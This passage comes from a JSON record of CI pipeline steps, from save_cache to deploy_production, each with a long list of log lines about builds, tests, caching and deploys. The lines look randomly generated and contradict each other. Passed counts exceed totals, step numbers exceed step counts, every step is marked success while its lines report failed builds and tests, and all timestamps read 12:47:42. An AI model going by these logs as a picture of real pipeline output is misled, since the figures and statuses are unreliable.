          "Coverage: 75% statements, 71% branches",
          "[12:47:42] INFO: Cache refreshed",
          "Using Node.js 14.11.9",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (49MB)",
          "Fetching submodules...",
          "Checking out develop branch",
          "Fetching from https://amazonaws.com/package.json",
          "NODE_ENV=development",
          "Creating production build...",
          "Success!",
          "pip: Collecting react",
          "Fetching from https://docker.io/package.json",
          "Environment: test",
          "yarn add: Done in 10.65s",
          "Completed.",
          "[12:47:42] DEBUG: Loading configuration",
          "[12:47:42] INFO: Starting build process",
          "Building Docker image...",
          "Cache saved successfully",
          "Step 13/22: Deploying",
          "[12:47:42] DEBUG: Initializing service",
          "  PASS: test_auth_login (412ms)",
          "Compiling components/utils.go...",
          "Snapshots: 9 passed, 46 total",
          "Pushing to registry...",
          "Fetching from https://npmjs.org/package.json",
          "npm notice: created a lockfile",
          "Uploading artifact 'coverage' (22 files)",
          "npm notice: package.json updated",
          "OK",
          "Time: 47.895s",
          "Compiling lib/app.ts...",
          "Using Python 3.10",
          "POST /data - 202 (485ms)",
          "Building Docker image...",
          "Snapshots: 0 passed, 0 total",
          "Creating production build...",
          "pip: Downloading lodash-2.4.tar.gz",
          "Layer 7/13: RUN command",
          "pip: Collecting react",
          "Minifying main.js",
          "Step 7/25: Testing",
          "Installing eslint@4.15.0",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-17T12:49:03.651730",
        "finished_at": "2025-12-17T12:49:15.868901",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact downloaded: 13MB",
          "[12:47:42] ERROR: Connection failed",
          "[12:47:42] DEBUG: Memory usage: 264MB",
          "Using Node.js 14.20.5",
          "Optimizing 42 modules...",
          "pip: Collecting eslint",
          "Artifact uploaded: dist.zip (87MB)",
          "[12:47:42] DEBUG: Connection pool: 4 active",
          "npm notice: created a lockfile",
          "yarn add: Done in 3.72s",
          "Coverage: 92% statements, 64% branches",
          "Done.",
          "Step 4/24: Linting",
          "Compiling utils/service.java...",
          "pip: Downloading express-2.13.tar.gz",
          "Finished.",
          "Image pulled successfully",
          "Loading...",
          "Test Suites: 41 passed, 6 total",
          "Verifying...",
          "Tests: 200 passed, 77 total",
          "Cache miss for key-5227",
          "npm notice: created a lockfile",
          "Artifact downloaded: 36MB",
          "pip: Installing build dependencies...",
          "Cache invalidated: dependencies",
          "Transforming 702 files...",
          "Exception: NullPointerException",
          "[12:47:42] INFO: Cache refreshed",
          "Platform: win32-x64",
          "[12:47:42] DEBUG: Connection pool: 14 active",
          "Fetching submodules...",
          "Compiling utils/utils.go...",
          "Bundling styles.css",
          "Step 12/15: Building",
          "Compiling src/service.java...",
          "pip: Downloading prettier-5.12.tar.gz",
          "Step 5/24: Testing",
          "Switched to branch 'bugfix/task-274'",
          "[12:47:42] DEBUG: Initializing service",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "Coverage: 96% statements, 75% branches",
          "\u2713 Step 'install' succeeded",
          "Processing...",
          "Test Suites: 16 passed, 22 total",
          "Exception: RuntimeError",
          "Using Python 3.12",
          "Connection established",
          "Pulling image: node:3.11",
          "yarn add: Done in 9.80s",
          "Snapshots: 9 passed, 48 total",
          "Switched to branch 'hotfix/task-126'",
          "Pulling image: alpine:3.11",
          "Compiling utils/main.py...",
          "\u2713 All checks passed",
          "Step 3/15: Installing dependencies",
          "HEAD is now at cb6d380",
          "Processing...",
          "HEAD is now at acfa1cc",
          "Cache hit for key-4239",
          "[12:47:42] INFO: Starting build process",
          "Connection established",
          "npm notice: package.json updated",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:42] DEBUG: Memory usage: 112MB",
          "pip: Collecting axios",
          "NODE_ENV=test",
          "Image pulled successfully",
          "pip: Collecting webpack",
          "Minifying vendor.js",
          "Optimizing 82 modules...",
          "Artifact downloaded: 6MB",
          "Minifying app.js",
          "Cache invalidated: node_modules",
          "Done.",
          "Bundling runtime.css",
          "[12:47:42] INFO: Connecting to database",
          "yarn add: Done in 29.59s",
          "[12:47:42] INFO: Starting build process",
          "[12:47:42] INFO: Connecting to database",
          "Minifying app.js",
          "pip: Collecting eslint",
          "Step 14/19: Installing dependencies",
          "Generating source maps...",
          "Platform: darwin-arm64",
          "[12:47:42] WARN: Deprecated API usage",
          "Waiting...",
          "Using Node.js 15.18.10",
          "POST /api - 202 (476ms)",
          "[12:47:42] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "Connection established",
          "\u2713 Task completed in 4357ms",
          "Finished.",
          "Optimizing 42 modules...",
          "OK",
          "\u2713 Task completed in 3345ms",
          "[12:47:42] DEBUG: Query executed in 19ms",
          "  PASS: e2e/test_db_connect.spec.js",
          "pip: Collecting webpack",
          "[12:47:42] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "[12:47:42] DEBUG: Connection pool: 6 active",
          "Image pulled successfully",
          "Connection established",
          "Using Python 3.12",
          "[12:47:42] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 495 passed, 452 total",
          "Compiling lib/service.java...",
          "Using Node.js 17.20.9",
          "TLS handshake completed",
          "Bundling vendor.js",
          "[12:47:42] DEBUG: Connection pool: 8 active",
          "pip: Collecting eslint",
          "Pulling image: alpine:latest",
          "yarn add: Done in 19.8s",
          "Completed.",
          "yarn add: Done in 21.56s",
          "GET /api - 200 (3ms)",
          "Completed.",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "pip: Downloading prettier-5.1.tar.gz",
          "\u2713 Step 'checkout' succeeded",
          "pip: Installing build dependencies...",
          "POST /api - 202 (482ms)",
          "Fetching from https://amazonaws.com/package.json",
          "\u2713 Task completed in 4003ms",
          "Transforming 689 files...",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at 1530c48",
          "Compiling lib/service.java...",
          "Minifying main.js",
          "Step 1/22: Linting",
          "[12:47:42] DEBUG: Memory usage: 1646MB",
          "NODE_ENV=development",
          "Transforming 558 files...",
          "[12:47:42] INFO: Processing request",
          "Connection established",
          "NODE_ENV=test",
          "Cache saved successfully",
          "Bundling vendor.js",
          "[12:47:42] DEBUG: Memory usage: 1569MB",
          "npm install: resolved 788 packages",
          "\u2713 deploy completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "Pulling image: node:18",
          "Compiling src/service.java...",
          "[12:47:42] INFO: Processing request",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 24.82s",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] INFO: Request completed",
          "Step 16/20: Linting",
          "Uploading artifact 'dist' (3 files)",
          "  PASS: unit/test_api_health.spec.js",
          "POST /data - 202 (284ms)",
          "  PASS: unit/test_db_connect.spec.js",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-17T12:49:15.868901",
        "finished_at": "2025-12-17T12:49:36.230853",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 Step 'install' succeeded",
          "pip: Downloading prettier-4.8.tar.gz",
          "Optimizing 96 modules...",
          "Using Python 3.10",
          "[12:47:42] DEBUG: Connection pool: 12 active",
          "Snapshots: 33 passed, 12 total",
          "pip: Installing build dependencies...",
          "Checking out master branch",
          "[12:47:42] DEBUG: Memory usage: 1580MB",
          "Test Suites: 8 passed, 21 total",
          "npm install: resolved 1159 packages",
          "Artifact uploaded: build.tar.gz (23MB)",
          "pip install: Successfully installed webpack-2.4",
          "\u2713 Step 'install' succeeded",
          "Completed.",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Step 'setup' succeeded",
          "Already up to date.",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] DEBUG: Query executed in 94ms",
          "[12:47:42] INFO: Starting build process",
          "TLS handshake completed",
          "Compiling src/app.ts...",
          "Compiling utils/app.ts...",
          "Compiling lib/handler.rs...",
          "OK",
          "pip install: Successfully installed axios-5.15",
          "Already up to date.",
          "OK",
          "Compiling lib/handler.rs...",
          "Building Docker image...",
          "GET /api - 201 (90ms)",
          "npm install: resolved 471 packages",
          "pip: Collecting prettier",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Task completed in 3629ms",
          "  PASS: test_cache_hit (41ms)",
          "Step 7/23: Deploying",
          "Finished.",
          "npm notice: package.json updated",
          "Compiling src/main.py...",
          "FAILED: test_api_health",
          "[12:47:42] ERROR: Connection failed",
          "TLS handshake completed",
          "Cache miss for key-8535",
          "Finished.",
          "Layer 5/8: ENV command",
          "[12:47:42] DEBUG: Memory usage: 870MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Ran 83 tests in 32s",
          "Time: 117.826s",
          "Using Python 3.9",
          "Transforming 241 files...",
          "Compiling lib/service.java...",
          "  PASS: test_auth_login (369ms)",
          "Cache restored successfully (463MB)",
          "Artifact uploaded: dist.zip (58MB)",
          "Time: 60.388s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:42] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "\u2713 Task completed in 3810ms",
          "Compiling components/utils.go...",
          "Loading...",
          "npm install: added 485 packages",
          "Verifying...",
          "\u2717 build failed with exit code 81",
          "Platform: darwin-arm64",
          "Layer 5/12: RUN command",
          "Bundling vendor.css",
          "  PASS: test_db_connect (323ms)",
          "[12:47:42] DEBUG: Initializing service",
          "\u2713 All checks passed",
          "Processing...",
          "Compiling lib/app.ts...",
          "Optimizing 17 modules...",
          "Installing react@2.12.7",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Finished.",
          "Optimizing 64 modules...",
          "Processing...",
          "[12:47:42] DEBUG: Memory usage: 1428MB",
          "FAILED: test_api_health",
          "pip: Installing build dependencies...",
          "POST /upload - 201 (127ms)",
          "Bundling styles.js",
          "[12:47:42] WARN: Deprecated API usage",
          "POST /upload - 202 (236ms)",
          "[12:47:42] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (35MB)",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 19/20: Testing",
          "\u2713 package completed",
          "npm notice: package.json updated",
          "Minifying app.js",
          "TLS handshake completed",
          "[12:47:42] INFO: Request completed",
          "Step 16/19: Installing dependencies",
          "[12:47:42] DEBUG: Query executed in 79ms",
          "FAILED: test_user_create",
          "HEAD is now at da2c0de",
          "\u2717 build failed with exit code 74",
          "Step 15/22: Testing",
          "[12:47:42] INFO: Request completed",
          "FAILED: test_cache_hit",
          "Completed.",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 4971ms",
          "TLS handshake completed",
          "npm install: added 278 packages",
          "pip: Collecting react",
          "[12:47:42] DEBUG: Loading configuration",
          "Loading...",
          "Environment: staging",
          "[12:47:42] INFO: Starting build process",
          "Done.",
          "Compiling components/service.java...",
          "Layer 6/12: COPY command",
          "NODE_ENV=production",
          "[12:47:42] DEBUG: Connection pool: 7 active",
          "[12:47:42] INFO: Connecting to database",
          "Finished.",
          "Pushing to registry...",
          "OK",
          "Cache saved successfully",
          "Compiling lib/main.py...",
          "Installing jest@4.6.10",
          "Compiling components/index.js...",
          "[12:47:42] INFO: Starting build process",
          "Cache hit for key-2803",
          "Switched to branch 'feature/task-697'",
          "Verifying...",
          "\u2713 lint completed",
          "pip: Installing build dependencies...",
          "Waiting...",
          "[12:47:42] DEBUG: Memory usage: 1114MB",
          "Environment: test",
          "[12:47:42] INFO: Processing request",
          "Compiling lib/service.java...",
          "[12:47:42] INFO: Starting build process",
          "Success!",
          "Pulling image: python:3.11",
          "Cache miss for key-5054",
          "Cache invalidated: build",
          "Compiling utils/handler.rs...",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:42] DEBUG: Connection pool: 12 active",
          "Cache miss for key-2464",
          "Switched to branch 'bugfix/task-703'",
          "Success!",
          "Success!",
          "Compiling utils/main.py...",
          "Using Node.js 14.1.5",
          "Time: 116.308s",
          "Ran 37 tests in 43s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.10",
          "Uploading artifact 'dist' (6 files)",
          "Exception: RuntimeError",
          "yarn add: Done in 11.64s",
          "Creating production build...",
          "Connection established",
          "Pushing to registry...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-17T12:49:36.230853",
        "finished_at": "2025-12-17T12:50:16.954756",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Transforming 566 files...",
          "Connection established",
          "Tests: 490 passed, 113 total",
          "[12:47:42] DEBUG: Initializing service",
          "pip: Downloading react-5.18.tar.gz",
          "Fetching submodules...",
          "Done.",
          "\u2717 build failed with exit code 25",
          "npm notice: created a lockfile",
          "  PASS: integration/test_api_health.spec.js",
          "Creating production build...",
          "npm notice: package.json updated",
          "Bundling styles.js",
          "[12:47:42] DEBUG: Loading configuration",
          "Fetching submodules...",
          "[12:47:42] DEBUG: Query executed in 51ms",
          "\u2713 All checks passed",
          "Compiling components/service.java...",
          "Verifying...",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/handler.rs...",
          "Step 17/17: Building",
          "[12:47:42] INFO: Cache refreshed",
          "\u2717 build failed with exit code 32",
          "Finished.",
          "npm install: resolved 1260 packages",
          "FAILED: test_api_health",
          "Tests: 452 passed, 440 total",
          "[12:47:42] INFO: Starting build process",
          "Step 5/15: Building",
          "pip install: Successfully installed webpack-2.5",
          "Cache hit for key-4218",
          "Connection established",
          "  PASS: test_auth_login (304ms)",
          "[12:47:42] INFO: Cache refreshed",
          "[12:47:42] INFO: Connecting to database",
          "FAILED: test_auth_login",
          "POST /upload - 200 (291ms)",
          "POST /api - 200 (200ms)",
          "Using Python 3.10",
          "npm notice: package.json updated",
          "[12:47:42] DEBUG: Query executed in 88ms",
          "Artifact downloaded: 43MB",
          "[12:47:42] DEBUG: Loading configuration",
          "Already up to date.",
          "TLS handshake completed",
          "Coverage: 74% statements, 89% branches",
          "[12:47:42] DEBUG: Loading configuration",
          "Optimizing 97 modules...",
          "  PASS: test_db_connect (167ms)",
          "[12:47:42] DEBUG: Query executed in 5ms",
          "Building Docker image...",
          "[12:47:42] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "[12:47:42] INFO: Processing request",
          "Cache miss for key-9778",
          "npm notice: package.json updated",
          "POST /upload - 200 (146ms)",
          "Compiling src/utils.go...",
          "Ran 21 tests in 40s",
          "[12:47:42] ERROR: Connection failed",
          "[12:47:42] INFO: Connecting to database",
          "Environment: staging",
          "Artifact uploaded: dist.zip (37MB)",
          "Building Docker image...",
          "Cache invalidated: build",
          "Test Suites: 40 passed, 50 total",
          "[12:47:42] INFO: Cache refreshed",
          "FAILED: test_db_connect",
          "Processing...",
          "Already up to date.",
          "Cache miss for key-6820",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 5.652s",
          "Snapshots: 33 passed, 11 total",
          "Compiling components/app.ts...",
          "Tests: 499 passed, 427 total",
          "Layer 4/10: COPY command",
          "Step 2/19: Deploying",
          "npm notice: package.json updated",
          "\u2713 Step 'test' succeeded",
          "[12:47:42] INFO: Processing request",
          "pip: Downloading webpack-5.6.tar.gz",
          "Bundling vendor.js",
          "Completed.",
          "Processing...",
          "HEAD is now at f756b05",
          "HEAD is now at 09f4b03",
          "Ran 26 tests in 50s",
          "Switched to branch 'bugfix/task-970'",
          "Minifying app.js",
          "NODE_ENV=test",
          "Snapshots: 28 passed, 34 total",
          "Compiling utils/index.js...",
          "[12:47:42] DEBUG: Connection pool: 4 active",
          "Finished.",
          "Step 10/17: Deploying",
          "Step 17/16: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:42] DEBUG: Query executed in 31ms",
          "[12:47:42] INFO: Processing request",
          "\u2713 Step 'build' succeeded",
          "Snapshots: 37 passed, 48 total",
          "Creating production build...",
          "[12:47:42] DEBUG: Initializing service",
          "[12:47:42] INFO: Connecting to database",
          "[12:47:42] INFO: Request completed",
          "Optimizing 59 modules...",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (30ms)",
          "npm notice: package.json updated",
          "Step 20/21: Installing dependencies",
          "Step 1/21: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=production",
          "POST /api - 202 (178ms)",
          "Waiting...",
          "FAILED: test_cache_hit",
          "Step 5/22: Linting",
          "Test Suites: 27 passed, 37 total",
          "Image pulled successfully",
          "pip: Downloading axios-2.2.tar.gz",
          "\u2713 Step 'install' succeeded",
          "pip install: Successfully installed express-1.14",
          "Step 16/24: Linting",
          "Artifact downloaded: 13MB",
          "Done.",
          "Creating production build...",
          "[12:47:42] INFO: Processing request",
          "Bundling runtime.js",
          "NODE_ENV=development",
          "Compiling utils/service.java...",
          "\u2713 Step 'setup' succeeded",
          "Fetching submodules...",
          "Processing...",
          "\u2713 Step 'checkout' succeeded",
          "Step 18/17: Testing",
          "Completed.",
          "Cache hit for key-3076",
          "Already up to date.",
          "[12:47:42] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: linux-x64",
          "Fetching submodules...",
          "TLS handshake completed",
          "Completed.",
          "Step 4/20: Running migrations",
          "Ready.",
          "NODE_ENV=test",
          "Transforming 864 files...",
          "Fetching submodules...",
          "Already up to date.",
          "[12:47:42] INFO: Starting build process",
          "Pushing to registry...",
          "Cache hit for key-3599",
          "[12:47:42] DEBUG: Initializing service",
          "Generating source maps...",
          "[12:47:42] DEBUG: Memory usage: 1352MB",
          "Installing prettier@5.13.10",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:42] INFO: Processing request",
          "[12:47:42] INFO: Processing request",
          "Environment: test",
          "[12:47:42] INFO: Cache refreshed",
          "Using Python 3.11",
          "Cache saved successfully",
          "Step 14/24: Testing",
          "Step 1/21: Deploying",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-17T12:50:16.954756",
        "finished_at": "2025-12-17T12:50:37.316708",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:47:42] INFO: Cache refreshed",
          "Coverage: 91% statements, 95% branches",
          "[12:47:42] INFO: Processing request",
          "npm install: added 486 packages",
          "Bundling vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:42] DEBUG: Connection pool: 1 active",
          "[12:47:42] INFO: Processing request",
          "yarn add: Done in 18.96s",
          "npm install: added 233 packages",
          "Bundling vendor.js",
          "TLS handshake completed",
          "Building Docker image...",
          "Environment: staging",
          "Cache restored successfully (180MB)",
          "\u2713 Task completed in 1763ms",
          "Fetching from https://githubusercontent.com/package.json",
          "npm install: added 182 packages",
          "  PASS: integration/test_auth_login.spec.js",
          "Success!",
          "Compiling components/handler.rs...",
          "Done.",
          "Finished.",
          "Exception: NullPointerException",
          "OK",
          "Finished.",
          "Time: 2.380s",
          "Cache saved successfully",
          "Layer 2/10: ENV command",
          "Time: 80.510s",
          "[12:47:42] DEBUG: Loading configuration",
          "Exception: TypeError",
          "Done.",
          "WARNING: prettier has known vulnerabilities",
          "Step 3/23: Installing dependencies",
          "Ran 115 tests in 14s",
          "Processing...",
          "Pushing to registry...",
          "GET /api - 200 (70ms)",
          "pip: Installing build dependencies...",
          "[12:47:42] DEBUG: Loading configuration",
          "Time: 64.726s",
          "pip: Collecting webpack",
          "[12:47:42] INFO: Processing request",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Using Python 3.9",
          "Transforming 447 files...",
          "Cache miss for key-6598",
          "[12:47:42] INFO: Processing request",
          "Using Python 3.9",
          "[12:47:42] DEBUG: Connection pool: 14 active",
          "Step 3/25: Testing",
          "Switched to branch 'bugfix/task-173'",
          "Ran 135 tests in 37s",
          "Layer 5/10: ENV command",
          "Creating production build...",
          "Step 2/19: Deploying",
          "Image pulled successfully",
          "Generating source maps...",
          "pip: Downloading axios-1.11.tar.gz",
          "NODE_ENV=test",
          "Using Node.js 17.3.7",
          "Image pulled successfully",
          "WARNING: lodash has known vulnerabilities",
          "NODE_ENV=development",
          "Coverage: 71% statements, 78% branches",
          "Compiling utils/utils.go...",
          "Artifact uploaded: dist.zip (9MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "POST /api - 201 (461ms)",
          "Already up to date.",
          "TLS handshake completed",
          "[12:47:42] WARN: Deprecated API usage",
          "Pushing to registry...",
          "OK",
          "Verifying...",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (78MB)",
          "[12:47:42] DEBUG: Connection pool: 1 active",
          "Environment: test",
          "GET /health - 201 (93ms)",
          "[12:47:42] INFO: Starting build process",
          "  PASS: unit/test_auth_login.spec.js",
          "Cache invalidated: dependencies",
          "Already up to date.",
          "Compiling components/main.py...",
          "[12:47:42] DEBUG: Connection pool: 5 active",
          "Step 5/16: Installing dependencies",
          "Minifying main.js",
          "Compiling src/service.java...",
          "Artifact uploaded: dist.zip (35MB)",
          "\u2713 lint completed",
          "Uploading artifact 'dist' (40 files)",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Processing...",
          "Optimizing 38 modules...",
          "Compiling src/index.js...",
          "Snapshots: 25 passed, 33 total",
          "Loading...",
          "Already up to date.",
          "Compiling components/main.py...",
          "Snapshots: 8 passed, 33 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:42] INFO: Processing request",
          "[12:47:42] DEBUG: Initializing service",
          "pip: Collecting jest",
          "[12:47:42] WARN: Deprecated API usage",
          "\u2713 Task completed in 2454ms",
          "Waiting...",
          "Step 12/19: Linting",
          "Pulling image: python:3.11",
          "Using Node.js 20.14.1",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2717 build failed with exit code 49",
          "Pulling image: alpine:3.11",
          "Generating source maps...",
          "Uploading artifact 'build' (35 files)",
          "Done.",
          "Creating production build...",
          "Success!",
          "Using Node.js 18.10.2",
          "Step 16/19: Deploying",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "NODE_ENV=development",
          "Switched to branch 'feature/task-851'",
          "npm notice: package.json updated",
          "Cache invalidated: build",
          "npm install: added 479 packages",
          "Cache hit for key-1163",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 Step 'setup' succeeded",
          "Snapshots: 44 passed, 24 total",
          "Completed.",
          "Pulling image: alpine:latest",
          "\u2713 Step 'build' succeeded",
          "Pushing to registry...",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /api - 200 (68ms)",
          "Checking out master branch",
          "Step 16/24: Deploying",
          "Building Docker image...",
          "Cache saved successfully",
          "npm install: added 316 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed eslint-1.5",
          "Using Node.js 17.19.2",
          "Bundling vendor.css",
          "Exception: ValueError",
          "Already up to date.",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Already up to date.",
          "Fetching from https://npmjs.org/package.json",
          "Cache restored successfully (481MB)",
          "npm install: added 135 packages",
          "[12:47:42] DEBUG: Connection pool: 17 active",
          "Snapshots: 11 passed, 21 total",
          "\u2713 Task completed in 758ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:42] ERROR: Connection failed",
          "\u2713 Task completed in 3989ms",
          "HEAD is now at eaa74db",
          "WARNING: eslint has known vulnerabilities",
          "Success!",
          "[12:47:42] DEBUG: Memory usage: 618MB",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-17T12:50:37.316708",
        "finished_at": "2025-12-17T12:50:45.461489",
        "log_lines": [
          "=== Step: deploy_production ===",
          "yarn add: Done in 26.43s",
          "Cache saved successfully",
          "pip: Downloading lodash-4.20.tar.gz",
          "Compiling lib/index.js...",
          "Coverage: 91% statements, 90% branches",
          "POST /upload - 202 (155ms)",
          "Uploading artifact 'dist' (9 files)",
          "[12:47:42] INFO: Processing request",
          "\u2713 Task completed in 3244ms",
          "npm install: resolved 983 packages",
          "Step 14/21: Deploying",
          "[12:47:42] ERROR: Connection failed",
          "Ready.",
          "\u2717 build failed with exit code 62",
          "\u2713 Step 'install' succeeded",
          "Step 5/16: Testing",
          "Success!",
          "Platform: linux-x64",
          "Coverage: 93% statements, 93% branches",
          "Coverage: 99% statements, 86% branches",
          "Artifact uploaded: dist.zip (80MB)",
          "Step 5/25: Building",
          "Snapshots: 33 passed, 38 total",
          "  PASS: test_api_health (173ms)",
          "Loading...",
          "Verifying...",
          "Checking out develop branch",
          "Ready.",
          "Processing...",
          "Building Docker image...",
          "Pushing to registry...",
          "Compiling utils/service.java...",
          "Waiting...",
          "Success!",
          "Pushing to registry...",
          "[12:47:42] WARN: Deprecated API usage",
          "npm install: resolved 340 packages",
          "HEAD is now at 76e2576",
          "Generating source maps...",
          "Waiting...",
          "[12:47:42] INFO: Starting build process",
          "TLS handshake completed",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "OK",
          "Ran 120 tests in 13s",
          "Using Node.js 15.5.1",
          "Fetching from https://github.com/package.json",
          "pip: Downloading eslint-5.8.tar.gz",
          "Artifact uploaded: dist.zip (67MB)",
          "TLS handshake completed",
          "[12:47:42] INFO: Processing request",
          "yarn add: Done in 17.62s",
          "Artifact uploaded: dist.zip (71MB)",
          "yarn add: Done in 4.42s",
          "POST /upload - 200 (357ms)",
          "Platform: darwin-arm64",
          "[12:47:42] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "pip: Installing build dependencies...",
          "Platform: linux-x64",
          "Platform: linux-x64",
          "WARNING: express has known vulnerabilities",
          "[12:47:42] INFO: Request completed",
          "Uploading artifact 'coverage' (6 files)",
          "Using Node.js 15.9.10",
          "Cache hit for key-5413",
          "[12:47:42] INFO: Starting build process",
          "Completed.",
          "Artifact downloaded: 49MB",
          "Uploading artifact 'dist' (12 files)",
          "Step 1/19: Running migrations",
          "Compiling lib/main.py...",
          "Step 17/25: Installing dependencies",
          "pip: Downloading eslint-3.16.tar.gz",
          "Connection established",
          "[12:47:42] DEBUG: Query executed in 36ms",
          "Uploading artifact 'dist' (46 files)",
          "Compiling components/service.java...",
          "pip: Collecting axios",
          "Generating source maps...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Step 20/16: Deploying",
          "Completed.",
          "Verifying...",
          "Finished.",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/app.ts...",
          "[12:47:42] DEBUG: Loading configuration",
          "Building Docker image...",
          "pip: Collecting eslint",
          "  PASS: e2e/test_user_create.spec.js",
          "Artifact downloaded: 1MB",
          "Image pulled successfully",
          "GET /health - 200 (52ms)",
          "Finished.",
          "\u2713 Step 'install' succeeded",
          "Cache hit for key-2882",
          "Installing webpack@1.8.5",
          "Done.",
          "Done.",
          "Fetching submodules...",
          "Optimizing 92 modules...",
          "[12:47:42] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "Compiling components/service.java...",
          "Ran 122 tests in 60s",
          "Snapshots: 8 passed, 7 total",
          "Environment: production",
          "[12:47:42] ERROR: Connection failed",
          "\u2713 Task completed in 1781ms",
          "Step 5/20: Testing",
          "[12:47:42] INFO: Cache refreshed",
          "[12:47:42] DEBUG: Loading configuration",
          "WARNING: prettier has known vulnerabilities",
          "Connection established",
          "Step 4/24: Testing",
          "NODE_ENV=development",
          "Ran 180 tests in 42s",
          "NODE_ENV=production",
          "Compiling lib/main.py...",
          "yarn add: Done in 22.23s",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: python:3.11",
          "Layer 7/11: ENV command",
          "Snapshots: 15 passed, 48 total",
          "[12:47:42] DEBUG: Query executed in 71ms",
          "NODE_ENV=production",
          "[12:47:42] INFO: Request completed",
          "Building Docker image...",
          "yarn add: Done in 4.84s",
          "[12:47:42] DEBUG: Query executed in 98ms",
          "[12:47:42] WARN: Deprecated API usage",
          "HEAD is now at 3256100",
          "Using Python 3.9",
          "Connection established",
          "Generating source maps...",
          "[12:47:42] INFO: Cache refreshed",
          "Tests: 422 passed, 101 total",
          "Minifying vendor.js",
          "Done.",
          "[12:47:42] DEBUG: Loading configuration",
          "Installing react@5.8.10",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: dist.zip (49MB)",
          "[12:47:42] INFO: Cache refreshed",
          "GET /api - 201 (88ms)",
          "Step 4/16: Running migrations",
          "\u2713 Step 'install' succeeded",
          "Layer 6/11: ENV command",
          "Loading...",
          "Ready.",
          "Creating production build...",
          "Step 9/19: Deploying",
          "[12:47:42] DEBUG: Connection pool: 12 active",
          "pip: Installing build dependencies...",
          "pip: Collecting axios",
          "Step 18/19: Building",
          "npm install: added 61 packages",
          "Environment: staging",
          "Using Node.js 17.2.3",
          "Completed.",
          "[12:47:42] INFO: Request completed",
          "npm notice: package.json updated",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-17T12:50:45.461489",
        "finished_at": "2025-12-17T12:50:57.678660",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Fetching submodules...",
          "\u2713 Task completed in 2107ms",
